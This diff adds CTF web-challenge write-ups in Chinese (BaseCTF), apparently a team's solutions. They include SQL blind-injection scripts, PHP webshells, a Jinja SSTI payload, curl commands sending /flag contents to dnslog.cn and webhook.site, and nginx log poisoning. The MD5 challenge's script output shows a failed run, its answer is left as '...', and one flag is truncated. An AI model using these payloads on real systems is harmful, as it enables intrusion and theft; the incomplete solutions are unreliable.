@@ -2464,6 +2464,832 @@ BaseCTF{a7898d44-ec20-484e-a640-bd3b09051ea5}
 
 
 
+### md5绕过欸
+
+#### 题目信息
+
+> ## md5绕过欸250 pts
+>
+> **出题:** ClearWine
+> **难度:** 入门
+>
+> ------
+>
+> 绕哇绕哇绕
+
+#### 解题过程
+
+##### 查看题目
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+require 'flag.php';
+
+if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2']) ){
+    $name = $_GET['name'];
+    $name2 = $_GET['name2'];
+    $password = $_POST['password'];
+    $password2 = $_POST['password2'];
+    if ($name != $password && md5($name) == md5($password)){
+        if ($name2 !== $password2 && md5($name2) === md5($password2)){
+            echo $flag;
+        }
+        else{
+            echo "再看看啊，马上绕过嘞！";
+        }
+    }
+    else {
+        echo "错啦错啦";
+    }
+
+}
+else {
+    echo '没看到参数呐';
+}
+```
+
+**分析**
+
+- MD5绕过，可用数组
+
+##### 编写payload
+
+```shell
+http://challenge.imxbt.cn:32149/
+GET name[]=1&name2[]=3
+POST password[]=2&password2[]=4
+```
+
+##### 发起攻击
+
+```shell
+BaseCTF{23d20e00-b57c-43db-9196-e1ade2dcdff0}
+```
+
+#### 题目答案
+
+##### 最终payload
+
+```shell
+http://challenge.imxbt.cn:32149/
+GET name[]=1&name2[]=3
+POST password[]=2&password2[]=4
+```
+
+##### 得到答案
+
+```shell
+BaseCTF{23d20e00-b57c-43db-9196-e1ade2dcdff0}
+```
+
+
+
+### only one sql
+
+#### 题目信息
+
+> ## only one sql257 pts
+>
+> **出题:** lazy_forever
+> **难度:** 中等
+>
+> ------
+>
+> 只可以一句哦
+> 使用BaseCTF{}格式
+>
+> 
+>
+> 既然没有select无法直接查看flag，有没有其他方式来推断flag呢，比如布尔，比如时间？
+
+#### 解题过程
+
+##### 查看题目
+
+```php
+<?php
+highlight_file(__FILE__);
+$sql = $_GET['sql'];
+if (preg_match('/select|;|@|\n/i', $sql)) {
+    die("你知道的，不可能有sql注入");
+}
+if (preg_match('/"|\$|`|\\\\/i', $sql)) {
+    die("你知道的，不可能有RCE");
+}
+//flag in ctf.flag
+$query = "mysql -u root -p123456 -e \"use ctf;select '没有select，让你执行一句又如何';" . $sql . "\"";
+system($query);
+```
+
+**分析**
+
+- 题目提示时间盲注，先找一下注入点
+
+##### 漏洞测试
+
+```shell
+GET sql=show columns from flag
+```
+
+```shell
+Field Type Null Key Default Extra id varchar(300) YES NULL data varchar(300) YES NULL
+```
+
+**分析**
+
+- 猜测flag在data处
+
+##### 编写脚本
+
+```python
+import string
+import requests
+
+url = "http://challenge.imxbt.cn:31761/?sql=delete from flag where data like '{}%' and sleep(4)"
+alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}" + '-'
+
+flag = ""
+while True:
+    if flag.endswith('}'):
+        break
+
+    for c in alphabet:
+        try:
+            r = requests.get(url.format(flag + c), timeout=3)
+        except:
+            flag += c
+            print(flag)
+            break
+```
+
+##### 发起攻击
+
+```shell
+basectf{a182fZFUlwYw...}
+```
+
+#### 题目答案
+
+##### 最终脚本
+
+```python
+import string
+import requests
+
+url = "http://challenge.imxbt.cn:31761/?sql=delete from flag where data like '{}%' and sleep(4)"
+alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}" + '-'
+
+flag = ""
+while True:
+    if flag.endswith('}'):
+        break
+
+    for c in alphabet:
+        try:
+            r = requests.get(url.format(flag + c), timeout=3)
+        except:
+            flag += c
+            print(flag)
+            break
+```
+
+##### 得到答案
+
+```shell
+basectf{a182fZFUlwYw...}
+```
+
+
+
+### upload
+
+##### 题目信息
+
+> ## upload250 pts
+>
+> **出题:** Kengwang
+> **难度:** 入门
+>
+> ------
+>
+> 快来上传你最喜欢的照片吧~ 等下,这个 php 后缀的照片是什么?
+
+#### 解题过程
+
+##### 查看题目
+
+```html
+<?php
+error_reporting(0);
+if (isset($_FILES['file'])) {
+    highlight_file(__FILE__);
+    $file = $_FILES['file'];
+    $filename = $file['name'];
+    $filetype = $file['type'];
+    $filesize = $file['size'];
+    $filetmp = $file['tmp_name'];
+    $fileerror = $file['error'];
+
+    if ($fileerror === 0) {
+        $destination = 'uploads/' . $filename;
+        move_uploaded_file($filetmp, $destination);
+        echo 'File uploaded successfully';
+    } else {
+        echo 'Error uploading file';
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>上传你喜欢的图片吧！</title>
+</head>
+
+<body>
+    <form action="" method="post" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <button type="submit">上传！</button>
+    </form>
+    <?php
+    $files = scandir('uploads');
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..') {
+            continue;
+        }
+        echo "<img src='uploads/$file' style=\"max-height: 200px;\" />";
+    }
+    ?>
+</body>
+
+</html>
+```
+
+**分析**
+
+- 文件上传漏洞
+
+##### 编写脚本
+
+```php
+<?=`cat /f*`;
+```
+
+##### 发起攻击
+
+```shell
+http://challenge.imxbt.cn:32106/uploads/php.php
+```
+
+```shell
+BaseCTF{d553638d-fb9e-4637-b77b-3a3a7e22cb4a}
+```
+
+#### 题目答案
+
+##### 最终脚本
+
+```php
+<?=`cat /f*`;
+```
+
+##### 得到答案
+
+```shell
+BaseCTF{d553638d-fb9e-4637-b77b-3a3a7e22cb4a}
+```
+
+
+
+### 一起吃豆豆
+
+#### 题目信息
+
+> ## 一起吃豆豆250 pts
+>
+> **出题:** Goku
+> **难度:** 简单
+>
+> ------
+>
+> 大家都爱玩的JS小游戏
+
+#### 解题过程
+
+##### 查看源码
+
+**index.js**
+
+```js
+context.fillText(_LIFE ? atob("QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==") : 'GAME OVER', this.x, this.y);
+```
+
+##### 解码密文
+
+```shell
+QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ
+```
+
+```shell
+BaseCTF{J5_gam3_1s_easy_t0_h4ck!!}
+```
+
+#### 题目答案
+
+##### 得到答案
+
+```shell
+BaseCTF{J5_gam3_1s_easy_t0_h4ck!!}
+```
+
+
+
+#### 你听不到我的声音
+
+##### 题目信息
+
+> ## 你听不到我的声音250 pts
+>
+> **出题:** Kengwang
+> **难度:** 简单
+>
+> ------
+>
+> 我要执行 shell 指令啦! 诶? 他的输出是什么? 为什么不给我?
+
+#### 解题过程
+
+##### 查看题目
+
+```php
+<?php
+highlight_file(__FILE__);
+shell_exec($_POST['cmd']);
+```
+
+**分析**
+
+- 无回显
+
+##### 方法一
+
+###### 编写payload
+
+```shell
+cmd=cat /f* > txt.txt
+```
+
+##### 方法二
+
+###### 编写payload
+
+```shell
+cmd=curl `cat /flag`.ociqfw.dnslog.cn
+```
+
+##### 方法三
+
+###### 编写payload
+
+```shell
+cmd=curl https://webhook.site/#!/view/f9280e85-7baa-4f28-8689-4d20879c0792/`cat /flag`
+```
+
+##### 方法四
+
+###### 编写payload
+
+```shell
+cmd=echo '<?php eval($_POST[0]);?>'>php.php
+```
+
+#### 题目答案
+
+##### 得到答案
+
+```shell
+BaseCTF{9acdce99-1c72-46e3-938d-3376096cceee}
+```
+
+
+
+### 喵喵喵´•ﻌ•`
+
+#### 题目信息
+
+> ## 喵喵喵´•ﻌ•`250 pts
+>
+> **出题:** Delete
+> **难度:** 入门
+>
+> ------
+>
+> 小明在学习PHP的过程中发现，原来php也可以执行系统的命令，于是开始疯狂学习.....
+
+#### 解题过程
+
+##### 查看题目
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+$a = $_GET['DT'];
+
+eval($a);
+
+?>
+```
+
+##### 编写payload
+
+```shell
+GET DT=system('cat /f*');
+```
+
+##### 发起攻击
+
+```shell
+GET DT=system('cat /f*');
+```
+
+```shell
+BaseCTF{55e4d17b-570e-47c1-a964-2b40e74c7c4f}
+```
+
+#### 题目答案
+
+##### 最终脚本
+
+```shell
+GET DT=system('cat /f*');
+```
+
+##### 得到答案
+
+```shell
+BaseCTF{55e4d17b-570e-47c1-a964-2b40e74c7c4f}
+```
+
+
+
+### 复读机
+
+#### 题目信息
+
+> ## 复读机250 pts
+>
+> **出题:** 晨曦
+> **难度:** 简单
+>
+> ------
+>
+> 一位复读机发明了一个复读机来复读flag
+
+#### 解题过程
+
+##### 查看题目
+
+```shell
+BaseCTF{test}
+```
+
+```shell
+BaseCTF{test}
+```
+
+```shell
+BaseCTF{{{1+1}}}
+```
+
+```
+你想干嘛？ 杂鱼~ 杂鱼~
+```
+
+**分析**
+
+- ssti注入绕过
+
+##### 漏洞测试
+
+```shell
+BaseCTF{%print(''['_''_''cl''as''s''_''_']['_''_''ba''se''_''_']['_''_''su''bc''la''ss''es''_''_']()[137])%}
+```
+
+```shell
+BaseCTF<class 'os._wrap_close'>
+```
+
+```shell
+BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('env')['rea''d']())%}
+```
+
+```shell
+BaseCTFKUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.96.0.1:443 HOSTNAME=basectf2024-af31bd546a754175 SHLVL=1 PYTHON_PIP_VERSION=23.0.1 HOME=/root OLDPWD=/ FLASK_RUN_FROM_CLI=true GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D WERKZEUG_SERVER_FD=3 _=/usr/local/bin/flask PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp GZCTF_FLAG=no_FLAG LANG=C.UTF-8 PYTHON_VERSION=3.10.14 PYTHON_SETUPTOOLS_VERSION=65.5.1 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 PWD=/app KUBERNETES_SERVICE_HOST=10.96.0.1 PYTHON_GET_PIP_SHA256=6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118 GZCTF_TEAM_ID=3440
+```
+
+**分析**
+
+- OLDPWD=/ 可用来绕过
+
+##### 发起攻击
+
+```shell
+BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('cd $OLDPWD;cat flag')['rea''d']())%}
+```
+
+```shell
+BaseCTFBaseCTF{bd6ba752-a754-48bd-8299-07f8db7e76f1}
+```
+
+#### 题目答案
+
+##### 最终payload
+
+```shell
+BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('cd $OLDPWD;cat flag')['rea''d']())%}
+```
+
+##### 得到答案
+
+```shell
+BaseCTF{bd6ba752-a754-48bd-8299-07f8db7e76f1}
+```
+
+
+
+### 所以你说你懂 MD5?
+
+#### 题目信息
+
+> ## 所以你说你懂 MD5?250 pts
+>
+> **出题:** Kengwang
+> **难度:** 中等
+>
+> ------
+>
+> 所以你说你懂 MD5?
+>
+> 
+>
+> 可以了解一下 `MD5 长度拓展攻击`
+
+#### 解题过程
+
+##### 查看题目
+
+```php
+<?php
+session_start();
+highlight_file(__FILE__);
+// 所以你说你懂 MD5 了?
+
+$apple = $_POST['apple'];
+$banana = $_POST['banana'];
+if (!($apple !== $banana && md5($apple) === md5($banana))) {
+    die('加强难度就不会了?');
+}
+
+// 什么? 你绕过去了?
+// 加大剂量!
+// 我要让他成为 string
+$apple = (string)$_POST['appple'];
+$banana = (string)$_POST['bananana'];
+if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
+    die('难吗?不难!');
+}
+
+// 你还是绕过去了?
+// 哦哦哦, 我少了一个等于号
+$apple = (string)$_POST['apppple'];
+$banana = (string)$_POST['banananana'];
+if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
+    die('嘻嘻, 不会了? 没看直播回放?');
+}
+
+// 你以为这就结束了
+if (!isset($_SESSION['random'])) {
+    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
+}
+
+// 你想看到 random 的值吗?
+// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
+$random = $_SESSION['random'];
+echo md5($random);
+echo '<br />';
+
+$name = $_POST['name'] ?? 'user';
+
+// check if name ends with 'admin'
+if (substr($name, -5) !== 'admin') {
+    die('不是管理员也来凑热闹?');
+}
+
+$md5 = $_POST['md5'];
+if (md5($random . $name) !== $md5) {
+    die('伪造? NO NO NO!');
+}
+
+// 认输了, 看样子你真的很懂 MD5
+// 那 flag 就给你吧
+echo "看样子你真的很懂 MD5";
+echo file_get_contents('/flag');
+```
+
+**分析**
+
+- MD5绕过
+
+##### 编写脚本
+
+```shell
+fastcoll -o m1 m2
+```
+
+```python
+import requests
+
+url = "http://challenge.imxbt.cn:32447/"
+
+with open("m1", "rb") as file:
+    m1 = file.read()
+with open("m2", "rb") as file:
+    m2 = file.read()
+
+files = {
+    'apple[]': (None, b'1'),
+    'banana[]': (None, b'2'),
+
+    'appple': (None, b'QNKCDZO'),
+    'bananana': (None, b'240610708'),
+
+    'apppple': (None, m1),
+    'banananana': (None, m2),
+}
+
+requestsSession = requests.Session()
+result = requestsSession.post(url, files=files)
+
+print(result.text)
+```
+
+##### 发起攻击
+
+```shell
+D:\Environment\python\python-3.13.0\python.exe D:\Work\test\python\1\Main.py 
+<code><span style="color: #000000">
+<br />echo&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'/flag'</span><span style="color: #007700">);</span>
+</span>
+</code>1933915c176debd27371917f7241f0b0<br />不是管理员也来凑热闹?
+
+进程已结束，退出代码为 0
+```
+
+#### 题目答案
+
+##### 最终脚本
+
+```python
+import requests
+
+url = "http://challenge.imxbt.cn:32447/"
+
+with open("m1", "rb") as file:
+    m1 = file.read()
+with open("m2", "rb") as file:
+    m2 = file.read()
+
+files = {
+    'apple[]': (None, b'1'),
+    'banana[]': (None, b'2'),
+
+    'appple': (None, b'QNKCDZO'),
+    'bananana': (None, b'240610708'),
+
+    'apppple': (None, m1),
+    'banananana': (None, m2),
+}
+
+requestsSession = requests.Session()
+result = requestsSession.post(url, files=files)
+
+print(result.text)
+```
+
+##### 得到答案
+
+```shell
+...
+```
+
+
+
+### 滤个不停
+
+#### 题目信息
+
+> ## 滤个不停250 pts
+>
+> **出题:** Datch
+> **难度:** 中等
+>
+> ------
+>
+> 过滤这么多还怎么玩！等等....不对劲
+
+#### 解题过程
+
+##### 查看题目
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+$incompetent = $_POST['incompetent'];
+$Datch = $_POST['Datch'];
+
+if ($incompetent !== 'HelloWorld') {
+    die('写出程序员的第一行问候吧！');
+}
+
+//这是个什么东东？？？
+$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
+$is_valid = true;
+
+foreach ($required_chars as $char) {
+    if (strpos($Datch, $char) === false) {
+        $is_valid = false;
+        break;
+    }
+}
+
+if ($is_valid) {
+
+    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];
+
+    foreach ($invalid_patterns as $pattern) {
+        if (stripos($Datch, $pattern) !== false) {
+            die('此路不通换条路试试?');
+        }
+    }
+
+
+    include($Datch);
+} else {
+    die('文件名不合规 请重试');
+}
+?>
+```
+
+**分析**
+
+- 通过User-Agent向Nignx日志注入木马，进而通过include文件包含漏洞触发木马
+
+##### 编写payload
+
+```shell
+http://challenge.imxbt.cn:31219/
+POST incompetent=HelloWorld&Datch=/var/log/nginx/access.log&x=system('cat /flag');
+User-Agent <?php eval($_POST['cmd']); ?>
+```
+
+##### 发起攻击
+
+```shell
+http://challenge.imxbt.cn:31219/
+POST incompetent=HelloWorld&Datch=/var/log/nginx/access.log&x=system('cat /flag');
+User-Agent <?php eval($_POST['cmd']); ?>
+```
+
+```shell
+10.10.235.192 - - [04/May/2026:00:09:02 +0800] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:02 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:05 +0800] "GET / HTTP/1.1" 200 5478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:05 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:12 +0800] "POST / HTTP/1.1" 200 6358 "http://challenge.imxbt.cn:32034/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:09:12 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:05 +0800] "POST / HTTP/1.1" 200 6816 "http://challenge.imxbt.cn:31219/" "-" "-" 10.10.235.192 - - [04/May/2026:00:10:05 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:28 +0800] "POST / HTTP/1.1" 200 7170 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:10:28 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:31 +0800] "POST / HTTP/1.1" 200 7280 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:10:31 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:40 +0800] "GET /txt.txt HTTP/1.1" 200 5478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:40 +0800] "GET /favicon.ico HTTP/1.1" 200 5478 "http://challenge.imxbt.cn:31219/txt.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:48 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:50 +0800] "POST / HTTP/1.1" 200 7286 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:10:51 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:11:10 +0800] "POST / HTTP/1.1" 200 8919 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:11:10 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:11:28 +0800] "GET / HTTP/1.1" 200 5472 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:11:28 +0800] "GET /txt.txt HTTP/1.1" 200 5472 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:12:23 +0800] "POST / HTTP/1.1" 200 9865 "http://challenge.imxbt.cn:31219/" "
+```
+
+#### 题目答案
+
+##### 最终payload
+
+```shell
+http://challenge.imxbt.cn:31219/
+POST incompetent=HelloWorld&Datch=/var/log/nginx/access.log&x=system('cat /flag');
+User-Agent <?php eval($_POST['cmd']); ?>
+```
+
+##### 得到答案
+
+```shell
+BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9}
+```
+
+
+
 # 队伍
 
 ## 名称
